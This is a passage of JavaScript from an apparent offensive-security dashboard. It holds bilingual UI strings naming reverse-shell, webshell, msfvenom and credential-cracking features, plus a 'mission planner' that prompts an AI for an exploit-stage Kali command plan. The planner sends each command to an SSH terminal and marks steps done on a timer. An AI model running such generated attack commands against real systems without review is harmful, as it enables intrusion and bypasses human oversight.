        noScansYet:        { en: 'No scans triggered yet. Configure your n8n URL and click "Trigger Scan".', es: 'Sin escaneos aún. Configura la URL de n8n y pulsa "Disparar Escaneo".' },
        aiAutomationAssistant:{ en: 'AI Automation Assistant', es: 'Asistente de Automatización IA' },
        aiAutomationPlaceholder:{ en: 'Ask about n8n workflows (e.g. scan automation, alerts...)', es: 'Pregunta sobre workflows n8n (ej: automatizar escaneos, alertas...)' },

        // ── Op Admiral ──
        opAdmiralTitle:    { en: '🎯 Op Admiral — Mission Planner', es: '🎯 Almirante — Planificador de Misiones' },
        clearPlan:         { en: '✕ Clear plan',       es: '✕ Limpiar plan' },
        progress:          { en: 'Progress',          es: 'Progreso' },
        generatePlan:      { en: '🎯 Generate Plan',   es: '🎯 Generar Plan' },
        executeAll:        { en: '▶ Execute All',      es: '▶ Ejecutar Todo' },
        planEmptyDesc:     { en: 'Describe the target and click "Generate Plan" to create a mission plan.', es: 'Describe el objetivo y pulsa "Generate Plan" para crear un plan de misión.' },
        planDescLabel:     { en: 'Describe the target…', es: 'Describe el objetivo…' },
        planDescPlaceholder:{ en: 'Ej: Escanear el target, encontrar vulnerabilidades en el puerto 80, intentar subir una webshell…', es: 'Ej: Escanear el target, encontrar vulnerabilidades en el puerto 80, intentar subir una webshell…' },
        // ── Mission History (Self-Improvement) ──
        missionHistoryTitle: { en: '📚 Mission History', es: '📚 Historial de Misiones' },
        saveMissionBtn:    { en: '💾 Save Mission',      es: '💾 Guardar Misión' },
        missionEmpty:      { en: 'No missions saved yet. Complete a scan and click "Save Mission".', es: 'Aún no hay misiones guardadas. Completa un escaneo y pulsa "Save Mission".' },

        // ── Swarm ──
        swarmTitle:        { en: '🐝 Swarm — Multi-Operator Pipeline', es: '🐝 Enjambre — Pipeline Multi-Operador' },
        swarmTarget:       { en: 'Target (IP or domain)', es: 'Objetivo (IP o dominio)' },
        startSwarm:        { en: '🚀 Start Swarm',     es: '🚀 Iniciar Enjambre' },
        cancelSwarm:       { en: '⏹ Cancel',          es: '⏹ Cancelar' },
        pipelineProgress:  { en: 'Pipeline progress',  es: 'Progreso del pipeline' },
        swarmFindings:     { en: '📊 Findings',       es: '📊 Hallazgos' },
        swarmLogs:         { en: '📋 Logs',            es: '📋 Logs' },
        swarmSessions:     { en: '📜 Previous sessions', es: '📜 Sesiones anteriores' },

        // ── Findings ──
        findingsAllFilter: { en: 'All',               es: 'Todos' },
        findingsCritical:  { en: '🔴 Critical',       es: '🔴 Crítico' },
        findingsHigh:      { en: '🟠 High',           es: '🟠 Alto' },
        findingsMedium:    { en: '🟡 Medium',         es: '🟡 Medio' },
        findingsLow:       { en: '🔵 Low',            es: '🔵 Bajo' },
        findingsInfo:      { en: 'ℹ️ Info',           es: 'ℹ️ Info' },
        noFindingsYet:     { en: 'No findings yet. Run a scan from the Arsenal to see results here.', es: 'Sin hallazgos aún. Ejecuta un escaneo desde el Arsenal para ver resultados.' },
        aiSuggestions:     { en: '🤖 AI Suggestions',  es: '🤖 Sugerencias IA' },

        // ── Credentials ──
        credentialStore:   { en: '🔑 Credential Store', es: '🔑 Almacén de Credenciales' },
        addCredential:     { en: '➕ Add Credential',  es: '➕ Añadir Credencial' },
        credTarget:        { en: 'Target (IP/domain)', es: 'Objetivo (IP/dominio)' },
        credService:       { en: 'Service (e.g. ssh, mysql)', es: 'Servicio (ej: ssh, mysql)' },
        credSource:        { en: 'Source (tool / method used to find it)', es: 'Origen (herramienta / método usado)' },
        aiCredentialAnalyst:{ en: 'AI Credential Analyst', es: 'Analista de Credenciales IA' },
        aiCredentialPlaceholder:{ en: 'Analyze hash, suggest cracking strategy, identify hash type...', es: 'Analizar hash, sugerir estrategia de cracking, identificar tipo de hash...' },

        // ── KnowledgeBase ──
        kbTitle:           { en: '📚 KnowledgeBase — CVE / MITRE ATT&CK', es: '📚 KnowledgeBase — CVE / MITRE ATT&CK' },
        aiKbAssistant:     { en: 'AI KnowledgeBase Assistant', es: 'Asistente de KnowledgeBase IA' },
        aiKbPlaceholder:   { en: 'Ask about CVEs, MITRE techniques, exploit methods...', es: 'Pregunta sobre CVEs, técnicas MITRE, métodos de exploit...' },
        kbBrowseEmpty:     { en: 'Type a query or leave empty to browse recent entries', es: 'Escribe una consulta o déjala vacía para ver entradas recientes' },

        // ── CTF ──
        ctfTitle:          { en: '🏴 CTF Mode',         es: '🏴 Modo CTF' },
        ctfScore:          { en: 'Score:',             es: 'Puntuación:' },
        ctfNewChallenge:   { en: '+ New Challenge',    es: '+ Nuevo Reto' },
        ctfCreateChallenge:{ en: 'Create Challenge',   es: 'Crear Reto' },
        aiCtfCoach:        { en: 'AI CTF Coach',       es: 'Entrenador CTF IA' },
        aiCtfPlaceholder:  { en: 'Need a hint? Ask about techniques, vectors, exploitation methods...', es: '¿Pista? Pregunta sobre técnicas, vectores, métodos de explotación...' },

        // ── Mobile ──
        mobileTitle:       { en: '📱 Mobile Analysis Lab', es: '📱 Lab de Análisis Móvil' },
        mobileSubtitle:    { en: 'APK Static + Dynamic Analysis', es: 'Análisis Estático + Dinámico APK' },
        uploadAnalyze:     { en: '📤 Upload & Analyze', es: '📤 Subir & Analizar' },
        analyzedApks:      { en: '📋 Analyzed APKs',    es: '📋 APKs Analizadas' },
        noApksYet:         { en: 'No APKs analyzed yet.', es: 'Sin APKs analizadas.' },
        analysisDetail:    { en: '🔍 Analysis Detail',  es: '🔍 Detalle de Análisis' },
        selectApk:         { en: 'Select an APK to view analysis', es: 'Selecciona una APK para ver el análisis' },
        dynamicAnalysis:   { en: '⚡ Dynamic Analysis (ADB + Frida)', es: '⚡ Análisis Dinámico (ADB + Frida)' },
        connectedDevices:  { en: 'Connected Devices',  es: 'Dispositivos Conectados' },
        fridaConsole:      { en: 'Frida Console',      es: 'Consola Frida' },
        runFrida:          { en: '▶ Run Frida Script', es: '▶ Ejecutar Script Frida' },
        aiMobileAssistant: { en: 'AI Mobile Assistant', es: 'Asistente Móvil IA' },
        aiMobileDesc:      { en: 'Ask about APK findings, permissions, exploitation techniques, or Frida scripts.', es: 'Pregunta sobre hallazgos APK, permisos, técnicas de explotación o scripts Frida.' },

        // ── Forensics ──
        forensicsTitle:    { en: '🔍 Forensics Lab',    es: '🔍 Lab Forense' },
        forensicsSubtitle: { en: 'File, Memory, Network & Steganography Analysis', es: 'Análisis de Archivos, Memoria, Red & Esteganografía' },
        evidence:          { en: '📋 Evidence',        es: '📋 Evidencia' },
        noEvidenceYet:     { en: 'No evidence yet.',    es: 'Sin evidencias.' },
        selectEvidence:    { en: 'Select evidence to view analysis', es: 'Selecciona evidencia para ver análisis' },
        aiForensicsAssistant:{ en: 'AI Forensics Assistant', es: 'Asistente Forense IA' },
        aiForensicsDesc:   { en: 'Ask about forensic artifacts, strings analysis, stego techniques, or next investigation steps.', es: 'Pregunta sobre artefactos forenses, análisis de strings, técnicas stego o próximos pasos.' },

        // ── EXIF OSINT ──
        "exif-title":      { en: 'EXIF Metadata OSINT', es: 'EXIF Metadata OSINT' },
        "exif-ready":      { en: 'Ready',               es: 'Listo' },
        "exif-drop-text":  { en: 'Drop an image here or click to upload', es: 'Arrastra una imagen o haz clic para subir' },
        "exif-drop-hint":  { en: 'Supports JPEG, PNG, TIFF, WebP (max 20MB)', es: 'Soporta JPEG, PNG, TIFF, WebP (máx 20MB)' },
        "exif-analyze-btn":{ en: 'Analyze URL',         es: 'Analizar URL' },
        "exif-analyzing":  { en: 'Analyzing image metadata...', es: 'Analizando metadatos de la imagen...' },
        "exif-format":     { en: 'Format',              es: 'Formato' },
        "exif-dimensions": { en: 'Dimensions',          es: 'Dimensiones' },
        "exif-file-size":  { en: 'File Size',           es: 'Tamaño' },
        "exif-has-exif":   { en: 'Has EXIF',            es: 'Tiene EXIF' },
        "exif-gps-title":  { en: '📍 GPS Location',      es: '📍 Ubicación GPS' },
        "exif-google-maps":{ en: 'Google Maps',         es: 'Google Maps' },
        "exif-osm":        { en: 'OpenStreetMap',       es: 'OpenStreetMap' },
        "exif-camera-title":{ en: '📸 Camera Information', es: '📸 Información de Cámara' },
        "exif-metadata-title":{ en: '📝 Metadata',     es: '📝 Metadatos' },
        "exif-thumbnail-title":{ en: '🖼️ Embedded Thumbnail', es: '🖼️ Miniatura Incrustada' },
        "exif-raw-title":  { en: '📋 All EXIF Tags',     es: '📋 Todas las Etiquetas EXIF' },
        "exif-tag":        { en: 'Tag',                 es: 'Etiqueta' },
        "exif-value":      { en: 'Value',               es: 'Valor' },
        "exif-no-exif":    { en: 'No EXIF metadata found in this image.', es: 'No se encontraron metadatos EXIF en esta imagen.' },
        "exif-export-md":  { en: 'Export Markdown',     es: 'Exportar Markdown' },
        "exif-export-html":{ en: 'Export HTML',         es: 'Exportar HTML' },
        "exif-export-pdf": { en: 'Export PDF',          es: 'Exportar PDF' },
        "exif-copy-json":  { en: 'Copy JSON',           es: 'Copiar JSON' },
        "exif-clear":      { en: 'Clear',               es: 'Limpiar' },
        "exif-location":   { en: 'Location',            es: 'Ubicación' },
        "exif-severity":   { en: 'Severity',            es: 'Severidad' },

        // ── Hak5 ──
        hak5PayloadStudio: { en: '🔌 Hak5 Payload Studio', es: '🔌 Hak5 Payload Studio' },
        hak5Credentials:   { en: '🔑 Credentials',      es: '🔑 Credenciales' },
        hak5Logout:        { en: '⚡ Logout',           es: '⚡ Cerrar sesión' },
        hak5Email:         { en: 'Email',              es: 'Correo' },
        hak5Password:      { en: 'Password',           es: 'Contraseña' },
        hak5Save:          { en: 'Save',               es: 'Guardar' },
        hak5Launch:        { en: 'Launch Payload Studio', es: 'Abrir Payload Studio' },
        hak5EditorTitle:   { en: '✏️ Payload Editor',  es: '✏️ Editor de Payloads' },
        hak5SaveBtn:       { en: '💾 Save',             es: '💾 Guardar' },
        hak5LoadBtn:       { en: '📂 Load',            es: '📂 Cargar' },
        hak5ListBtn:       { en: '📋 List',            es: '📋 Listar' },
        hak5ClearBtn:      { en: '✕ Clear',           es: '✕ Limpiar' },
        hak5AiBtn:         { en: '🤖 AI',              es: '🤖 IA' },
        hak5PayloadLabel:  { en: 'PAYLOAD',            es: 'PAYLOAD' },

        // ── Scope Guard ──
        scopeGuard:        { en: '🔒 Scope Guard',     es: '🔒 Guardia de Scope' },
        scopeEnable:       { en: 'Enable scope enforcement', es: 'Habilitar enforzamiento de scope' },
        scopeWarnOnly:     { en: '⚠ Warn only',       es: '⚠ Solo advertir' },
        scopeBlock:        { en: '🔒 Block out-of-scope', es: '🔒 Bloquear fuera de scope' },
        scopeAllowedTargets:{ en: 'Allowed targets (one per line — IP, CIDR, domain, *.wildcard)', es: 'Objetivos permitidos (uno por línea — IP, CIDR, dominio, *.comodín)' },
        scopeSaveConfig:   { en: '💾 Save Config',     es: '💾 Guardar Config' },
        scopeBlockHistory: { en: '📋 Block History',  es: '📋 Historial de Bloqueos' },

        // ── Bounty ──
        bountyTargetUrl:   { en: 'Target URL / IP',    es: 'URL / IP del Objetivo' },
        bountyVuln:         { en: 'Vulnerability',     es: 'Vulnerabilidad' },
        bountySeverity:     { en: 'Severity',          es: 'Severidad' },
        bountyComponent:   { en: 'Affected Component', es: 'Componente Afectado' },
        bountyDescription: { en: 'Description',       es: 'Descripción' },
        bountySteps:       { en: 'Steps to Reproduce', es: 'Pasos para Reproducir' },
        bountyImpact:      { en: 'Impact',            es: 'Impacto' },
        bountyPoc:         { en: 'Proof of Concept',  es: 'Prueba de Concepto' },
        bountyFix:         { en: 'Recommendation / Fix', es: 'Recomendación / Solución' },
        bountyGenerate:    { en: '⚡ Generate Report', es: '⚡ Generar Reporte' },
        bountyEnhance:     { en: '🤖 Enhance',        es: '🤖 Mejorar' },
        bountyDownload:    { en: '⬇ Download',        es: '⬇ Descargar' },
        bountyPreview:     { en: 'Preview',            es: 'Vista previa' },

        // ── AI Writeup ──
        aiMachine:         { en: 'Machine / Target',  es: 'Máquina / Objetivo' },
        aiKeyFindings:     { en: 'Key Findings (one per line)', es: 'Hallazgos Clave (uno por línea)' },
        aiStepsTaken:      { en: 'Steps Taken (summary)', es: 'Pasos Realizados (resumen)' },
        aiFlagsCaptured:   { en: 'Flags Captured (optional)', es: 'Flags Capturadas (opcional)' },
        aiGeneratedWriteup:{ en: 'Generated Writeup',  es: 'Writeup Generado' },

        // ── Scripts ──
        scriptBlank:       { en: '📄 Blank',          es: '📄 Vacío' },
        scriptBashRev:     { en: '🐚 Bash Rev',       es: '🐚 Bash Rev' },
        scriptPythonRev:   { en: '🐍 Python Rev',     es: '🐍 Python Rev' },
        scriptPhpWeb:     { en: '🐘 PHP Web',        es: '🐘 PHP Web' },
        scriptPsRev:       { en: '🪟 PS Rev',          es: '🪟 PS Rev' },
        scriptMsfvenom:   { en: '💉 Msfvenom',       es: '💉 Msfvenom' },
        scriptGenerate:   { en: '🤖 Generate',        es: '🤖 Generar' },
        scriptSave:       { en: '💾 Save',            es: '💾 Guardar' },
        scriptLoad:       { en: '📂 Load',            es: '📂 Cargar' },

        // ── OPSEC Levels ──
        opsecModalTitle:   { en: '🎯 OPSEC Level',      es: '🎯 Nivel OPSEC' },
        opsecModalDesc:    { en: 'Controls how much noise tools make on the target.', es: 'Controla cuánto ruido generan las herramientas en el target.' },
        opsecSilentDesc:   { en: 'Passive only. No scan that generates logs.', es: 'Solo pasivo. Sin escaneos que generen logs.' },
        opsecCovertDesc:   { en: 'Slow & stealthy. Rate-limited scans.', es: 'Lento y sigiloso. Escaneos con rate-limit.' },
        opsecLoudDesc:     { en: 'Maximum speed. Noisy. For labs/CTF.', es: 'Máxima velocidad. Ruidoso. Para labs/CTF.' },
        save:              { en: 'Save',                es: 'Guardar' },

        // ── Docker Control ──
        dockerModalTitle:  { en: 'Docker Stack',          es: 'Stack Docker' },
        dockerStatus:      { en: 'Status',                es: 'Estado' },
        dockerStart:       { en: '▶ Start',               es: '▶ Iniciar' },
        dockerStop:        { en: '■ Stop',                es: '■ Parar' },
        dockerClean:       { en: '🗑 Clean',              es: '🗑 Limpiar' },
        dockerBuild:       { en: '⚡ Rebuild',            es: '⚡ Reconstruir' },
    };

    window.currentLang = localStorage.getItem('vulnforge_lang') || 'en';

    window.switchLanguage = function () {
        window.currentLang = window.currentLang === 'en' ? 'es' : 'en';
        localStorage.setItem('vulnforge_lang', window.currentLang);
        applyLanguage(window.currentLang);
        document.getElementById('lang-text').textContent = window.currentLang.toUpperCase();
        showToast(`🌐 Language: ${window.currentLang === 'en' ? 'English' : 'Español'}`);
    };

    function applyLanguage(lang) {
        document.documentElement.lang = lang;

        // Update all data-i18n elements
        document.querySelectorAll('[data-i18n]').forEach(el => {
            const key = el.getAttribute('data-i18n');
            if (translations[key] && translations[key][lang]) {
                const text = translations[key][lang];
                // If the translation uses {n}, preserve child elements (stats bar)
                if (text.includes('{n}')) {
                    const numEl = el.querySelector('[id]');
                    if (numEl) {
                        const n = numEl.textContent;
                        const filled = text.replace('{n}', n);
                        el.innerHTML = filled.replace(n, `<span id="${numEl.id}">${n}</span>`);
                    }
                } else {
                    el.textContent = text;
                }
            }
        });

        // Update title
        document.title = `M.I.R.V. — ${lang === 'en' ? 'Incident Response & Vulnerability Framework' : 'Framework de Respuesta a Incidentes y Vulnerabilidades'}`;

        // Update placeholders
        const targetPlaceholder = translations.targetPlaceholder[lang];
        const targetInput = document.getElementById('target-ip');
        if (targetInput) targetInput.placeholder = targetPlaceholder;

        const cmdInput = document.getElementById('cmd-input');
        if (cmdInput) cmdInput.placeholder = translations.cmdPlaceholder[lang];

        // Update connection selector
        const connSel = document.getElementById('conn-selector');
        if (connSel) {
            const firstOpt = connSel.querySelector('option:first-child');
            if (firstOpt) firstOpt.textContent = translations.selTarget[lang];
        }

        // Update connection form placeholders
        const connName = document.getElementById('new-conn-name');
        if (connName) connName.placeholder = translations.connAlias[lang];
        const connIP = document.getElementById('new-conn-ip');
        if (connIP) connIP.placeholder = translations.connIP[lang];
        const connUser = document.getElementById('new-conn-user');
        if (connUser) connUser.placeholder = translations.connUser[lang];
        const connPass = document.getElementById('new-conn-pass');
        if (connPass) connPass.placeholder = translations.connPass[lang];

        // Update new connection buttons
        const saveBtn = document.querySelector('#add-conn-form button:first-child');
        if (saveBtn) saveBtn.textContent = translations.btnSave[lang];
        const cancelBtn = document.querySelector('#add-conn-form button:last-child');
        if (cancelBtn) cancelBtn.textContent = translations.btnCancel[lang];

        // Update empty report state
        const reportEmpty = document.querySelector('.report-empty');
        if (reportEmpty) {
            const nodes = reportEmpty.children;
            if (nodes[1]) nodes[1].textContent = translations.noReports[lang];
            if (nodes[2]) nodes[2].textContent = translations.noReportsDesc[lang];
        }

        // Update Findings AI config placeholders
        const suggestKey = document.getElementById('suggest-key');
        if (suggestKey) suggestKey.placeholder = translations.apiKeyPlaceholder[lang];
        const suggestModel = document.getElementById('suggest-model');
        if (suggestModel) suggestModel.placeholder = translations.modelPlaceholder[lang];

        // ── AI assistant placeholders (per-tab) ──
        const aiPlaceholders = {
            'reports-ai-question':      translations.aiReportPlaceholder,
            'automation-ai-question':   translations.aiAutomationPlaceholder,
            'cred-ai-question':         translations.aiCredentialPlaceholder,
            'kb-ai-question':           translations.aiKbPlaceholder,
            'ctf-ai-question':          translations.aiCtfPlaceholder,
            'mobile-ai-question':        translations.aiMobileDesc,
            'forensics-ai-question':    translations.aiForensicsDesc,
            'n8n-target':               translations.scanTarget,
            'n8n-url':                  translations.n8nUrl,
            'plan-desc':                translations.planDescPlaceholder,
            'cred-target':              translations.credTarget,
            'cred-username':            translations.connUser,
            'cred-service':             translations.credService,
            'cred-source':              translations.credSource,
        };
        for (const [id, tr] of Object.entries(aiPlaceholders)) {
            const el = document.getElementById(id);
            if (el && tr && tr[lang]) el.placeholder = tr[lang];
        }

        // ── KB empty state ──
        const kbEmpty = document.getElementById('kb-results');
        if (kbEmpty && kbEmpty.children.length === 1 && kbEmpty.children[0].classList.contains('text-center')) {
            kbEmpty.children[0].textContent = translations.kbBrowseEmpty[lang];
        }

        // ── Mobile APK empty state ──
        const mobileList = document.getElementById('mobile-apk-list');
        if (mobileList && mobileList.children.length === 1) {
            mobileList.children[0].textContent = translations.noApksYet[lang];
        }

        // ── Forensics evidence empty state ──
        const forensicsList = document.getElementById('forensics-list');
        if (forensicsList && forensicsList.children.length === 1) {
            forensicsList.children[0].textContent = translations.noEvidenceYet[lang];
        }

        // ── Cred list empty state ──
        const credList = document.getElementById('cred-list');
        if (credList && credList.children.length === 1) {
            credList.children[0].textContent = translations.credentialStore[lang];
        }

        // ── Mobile/Forensics analysis placeholder ──
        const mobileAnalysis = document.getElementById('mobile-analysis');
        if (mobileAnalysis && mobileAnalysis.children.length === 1) {
            mobileAnalysis.children[0].textContent = translations.selectApk[lang];
        }
        const forensicsAnalysis = document.getElementById('forensics-analysis');
        if (forensicsAnalysis && forensicsAnalysis.children.length === 1) {
            forensicsAnalysis.children[0].textContent = translations.selectEvidence[lang];
        }

        // ── AI response placeholders ──
        const aiAnswers = ['mobile-ai-answer', 'forensics-ai-answer', 'reports-ai-answer',
                          'automation-ai-answer', 'cred-ai-answer', 'kb-ai-answer', 'ctf-ai-answer'];
        for (const id of aiAnswers) {
            const el = document.getElementById(id);
            if (el && el.textContent.includes('will appear')) {
                el.textContent = translations.aiResponseHere[lang];
            }
        }

        // ── Mobile/Forensics AI "Ask AI" button label ──
        document.querySelectorAll('button[data-i18n="aiAskAIBtn"]').forEach(btn => {
            btn.textContent = translations.aiAskAIBtn[lang];
        });
    }

    // Apply saved language on load
    if (window.currentLang === 'es') {
        document.getElementById('lang-text').textContent = 'ES';
        applyLanguage('es');
    } else {
        document.getElementById('lang-text').textContent = 'EN';
        applyLanguage('en');
    }

    // ============================================================
    //  EVENT LISTENERS
    // ============================================================
    btnConnect.addEventListener('click', connectWS);
    btnDisconnect.addEventListener('click', disconnectWS);
    btnSend.addEventListener('click', window.sendCommand);

    cmdInput.addEventListener('keypress', (event) => {
        if (event.key === 'Enter') window.sendCommand();
    });

    targetInput.addEventListener('keypress', (event) => {
        if (event.key === 'Enter') window.launchTool('gobuster');
    });

    // ── Init ──
    loadConnections();
    loadSavedScripts();
    loadAIConfig();
    renderArsenal();
    window.collapseAllCategories(); // start collapsed
    initEventListeners();
    window.appendBanner();
    // Load persistent findings from backend
    _loadFindingsFromBackend();
    // Init CTF
    if (typeof ctfLoad === 'function') ctfLoad();
    // Init Mobile
    if (typeof mobileLoad === 'function') { mobileLoad(); mobileLoadFridaScripts(); }
    // Init Forensics
    if (typeof forensicsLoad === 'function') forensicsLoad();

    // ============================================================
    //  OP ADMIRAL — MISSION PLANNER
    // ============================================================
    let missionPlan = [];
    let currentStepIndex = -1;

    function extractJSON(text) {
        // Try to extract JSON array from markdown code blocks or raw text
        // 1. Check for ```json ... ``` blocks
        const mdMatch = text.match(/```(?:json)?\s*\n?([\s\S]*?)\n?```/);
        if (mdMatch) {
            try { return JSON.parse(mdMatch[1].trim()); } catch {}
        }
        // 2. Try to find a JSON array directly
        const arrMatch = text.match(/\[[\s\S]*\]/);
        if (arrMatch) {
            try { return JSON.parse(arrMatch[0]); } catch {}
        }
        // 3. Try the whole text
        try { return JSON.parse(text); } catch {}
        return null;
    }

    function updatePlanProgress() {
        const total = missionPlan.length;
        const done = missionPlan.filter(s => s.status === 'done').length;
        const pct = total > 0 ? Math.round((done / total) * 100) : 0;
        const container = document.getElementById('plan-progress-container');
        const bar = document.getElementById('plan-progress-bar');
        const pctEl = document.getElementById('plan-progress-pct');
        const labelEl = document.getElementById('plan-progress-label');
        if (total > 0) {
            container.classList.remove('hidden');
            bar.style.width = pct + '%';
            pctEl.textContent = pct + '%';
            labelEl.textContent = `${done}/${total} steps completed`;
            // Color changes based on progress
            if (pct === 100) {
                bar.className = 'bg-neon h-2 rounded-full transition-all duration-500';
            } else if (pct >= 50) {
                bar.className = 'bg-cyber h-2 rounded-full transition-all duration-500';
            } else {
                bar.className = 'bg-cyber/60 h-2 rounded-full transition-all duration-500';
            }
        } else {
            container.classList.add('hidden');
        }
    }

    window.renderPlan = function () {
        const container = document.getElementById('plan-steps');
        const emptyEl = document.getElementById('plan-empty');
        const execAllBtn = document.getElementById('btn-execute-all');
        const statusEl = document.getElementById('plan-status');

        if (missionPlan.length === 0) {
            container.innerHTML = '';
            container.appendChild(emptyEl || createEmptyEl());
            if (emptyEl) emptyEl.classList.remove('hidden');
            execAllBtn.disabled = true;
            statusEl.textContent = '';
            updatePlanProgress();
            return;
        }

        // Check if any pending steps exist
        const hasPending = missionPlan.some(s => s.status === 'pending');
        execAllBtn.disabled = !hasPending;

        // Count stats
        const done = missionPlan.filter(s => s.status === 'done').length;
        const failed = missionPlan.filter(s => s.status === 'failed').length;
        statusEl.textContent = `${done} done · ${failed} failed · ${missionPlan.length - done - failed} pending`;

        const statusIcons = { pending: '○', running: '▶', done: '✅', failed: '❌' };
        const statusColors = {
            pending: 'text-gray-700',
            running: 'text-cyber animate-pulse',
            done: 'text-neon',
            failed: 'text-blood'
        };
        const borderColors = {
            pending: 'border-gray-800',
            running: 'border-cyber/40',
            done: 'border-neon/30',
            failed: 'border-blood/30'
        };

        container.innerHTML = missionPlan.map((step, i) => {
            const prevDone = i === 0 || missionPlan[i - 1].status === 'done';
            const execDisabled = step.status !== 'pending' || !prevDone;
            const copyDisabled = !step.command;
            return `
            <div class="bg-void border ${borderColors[step.status]} rounded-lg p-3 transition-all duration-200" data-step="${i}">
                <div class="flex items-center justify-between mb-1.5">
                    <div class="flex items-center gap-2">
                        <span class="text-[10px] ${statusColors[step.status]} font-mono">${statusIcons[step.status]}</span>
                        <span class="text-[10px] text-gray-600 font-mono">Step ${i + 1}</span>
                        <span class="text-[11px] text-gray-300 font-semibold">${escapeHTML(step.title)}</span>
                    </div>
                    <div class="flex items-center gap-1">
                        <button data-action="plan-copy-cmd" data-idx="${i}"
                            class="text-[9px] text-gray-600 hover:text-cyber transition-colors px-1.5 py-0.5 rounded hover:bg-cyber/10"
                            ${copyDisabled ? 'disabled title="No command"' : ''}>
                            📋 Copy
                        </button>
                        <button data-action="plan-exec-step" data-idx="${i}"
                            class="text-[9px] text-neon/60 hover:text-neon transition-colors px-1.5 py-0.5 rounded hover:bg-neon/10"
                            ${execDisabled ? 'disabled title="Complete previous steps first"' : ''}>
                            ▶ Execute
                        </button>
                    </div>
                </div>
                <div class="text-[10px] text-gray-500 leading-relaxed mb-2 ml-5">${escapeHTML(step.description)}</div>
                ${step.command ? `<div class="ml-5 flex items-center gap-2 bg-deep rounded px-2 py-1.5 border border-gray-800">
                    <code class="text-[10px] text-cyber/80 font-mono flex-1 overflow-x-auto whitespace-nowrap">${escapeHTML(step.command)}</code>
                </div>` : ''}
            </div>`;
        }).join('');

        updatePlanProgress();
    };

    function createEmptyEl() {
        const div = document.createElement('div');
        div.className = 'text-center text-[11px] text-gray-700 py-8';
        div.id = 'plan-empty';
        div.textContent = 'Describe the target and click "Generate Plan" to create a mission plan.';
        return div;
    }

    function escapeHTML(str) {
        if (!str) return '';
        return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
    }

    window.generatePlan = async function () {
        const desc = document.getElementById('plan-desc').value.trim();
        if (!desc) {
            showToast('⚠️ Describe the mission objective first');
            return;
        }

        const btn = document.getElementById('btn-generate-plan');
        const statusEl = document.getElementById('plan-status');
        btn.disabled = true;
        btn.textContent = '⏳ Generating...';
        statusEl.textContent = 'AI is planning the mission...';
        missionPlan = [];
        window.renderPlan();

        const target = document.getElementById('target-ip')?.value?.trim() || 'unknown';
        const findings = window.collectFindingsText ? window.collectFindingsText() : 'No findings yet';

        const systemPrompt = `Eres Op Admiral, un planificador de misiones ofensivas de ciberseguridad. Genera un plan paso a paso basado en la descripción del objetivo.

Contexto:
- Target: ${target}
- Hallazgos actuales: ${findings || 'Ninguno aún'}

Devuelve SOLO un array JSON válido con objetos:
[{"title": "Nombre del paso", "description": "Qué hace y por qué es importante", "command": "comando exacto de Kali Linux para ejecutar"}]

Reglas:
- Máximo 8 pasos
- Cada comando debe ser una herramienta real de Kali Linux
- Ordena los pasos de forma lógica (recon → enum → exploit → post)
- Si no hay un comando específico, deja command como cadena vacía ""
- NO incluyas explicación fuera del JSON`;

        try {
            const result = await window.aiChat(systemPrompt, desc);
            if (!result) {
                showToast('⚠️ AI returned no response');
                btn.disabled = false;
                btn.textContent = '🎯 Generate Plan';
                statusEl.textContent = '';
                return;
            }

            const parsed = extractJSON(result);
            if (!parsed || !Array.isArray(parsed)) {
                showToast('⚠️ AI response was not a valid JSON array');
                // Show raw response in terminal for debugging
                window.appendOutput(`\n[Op Admiral] AI response:\n${result}`);
                btn.disabled = false;
                btn.textContent = '🎯 Generate Plan';
                statusEl.textContent = '';
                return;
            }

            missionPlan = parsed.slice(0, 8).map((step, i) => ({
                id: i,
                title: step.title || `Step ${i + 1}`,
                description: step.description || '',
                command: step.command || '',
                status: 'pending'
            }));

            window.renderPlan();
            showToast(`🎯 Mission plan generated: ${missionPlan.length} steps`);
            statusEl.textContent = `${missionPlan.length} steps ready`;
        } catch (err) {
            showToast(`⚠️ Plan generation failed: ${err.message}`);
        } finally {
            btn.disabled = false;
            btn.textContent = '🎯 Generate Plan';
        }
    };

    window.executeStep = function (index) {
        if (index < 0 || index >= missionPlan.length) return;
        const step = missionPlan[index];

        // Check previous step is done (except first)
        if (index > 0 && missionPlan[index - 1].status !== 'done') {
            showToast('⚠️ Complete the previous step first');
            return;
        }

        if (step.status !== 'pending') return;
        if (!step.command) {
            // No command — mark as done (informational step)
            step.status = 'done';
            window.renderPlan();
            showToast(`✅ Step ${index + 1} completed (no command needed)`);
            return;
        }

        step.status = 'running';
        currentStepIndex = index;
        window.renderPlan();

        // Send command to terminal SSH
        window.sendPredefinedCmd(step.command);

        // After 3s, mark as done (command dispatched to terminal)
        setTimeout(() => {
            step.status = 'done';
            currentStepIndex = -1;
            window.renderPlan();
            showToast(`✅ Step ${index + 1} dispatched to terminal`);
        }, 3000);
    };

    window.executeAllSteps = function () {
        const pending = missionPlan.filter(s => s.status === 'pending');
        if (pending.length === 0) {
            showToast('ℹ️ No pending steps to execute');
            return;
        }

        showToast(`▶ Executing ${pending.length} steps sequentially...`);

        let delay = 0;
        missionPlan.forEach((step, i) => {
            if (step.status === 'pending') {
                setTimeout(() => window.executeStep(i), delay);
                delay += 2500; // 2.5s between steps
            }
        });
    };

    window.clearPlan = function () {
        missionPlan = [];
        currentStepIndex = -1;
        document.getElementById('plan-desc').value = '';
        document.getElementById('plan-steps').innerHTML = '';
        const emptyEl = createEmptyEl();
        document.getElementById('plan-steps').appendChild(emptyEl);
        document.getElementById('btn-execute-all').disabled = true;
        document.getElementById('plan-status').textContent = '';
        updatePlanProgress();
        showToast('🗑 Plan cleared');
    };

    window.copyPlanCommand = function (index) {
        const step = missionPlan[index];
        if (!step || !step.command) {
            showToast('⚠️ No command to copy');
            return;
        }
        navigator.clipboard.writeText(step.command).then(() => {
            showToast('📋 Command copied to clipboard');
        }).catch(() => {
            showToast('⚠️ Failed to copy command');
        });
    };

    // ============================================================
    //  MISSION HISTORY — Self-Improvement Loop
    //  (POST /api/missions/save, GET /api/missions)
    // ============================================================
    let _missionHistoryCache = [];

    // OS detection catalog — matches web server banners, service banners,
    // direct OS strings, and appliances/networking gear. Returns the first
    // match acotado a 60-80 chars (no 120 — eso captura ruido de líneas largas).
    const OS_PATTERNS = [
        // ── Web servers / proxies ──
        /Apache-Coyote\/[\d.]+/i, /Apache-Tomcat\/[\d.]+/i, /Tomcat\/[\d.]+/i,
        /Jetty\([\w.\d\s]+\)/i, /OpenResty\/[\d.]+/i, /Tengine\/[\d.]+/i,
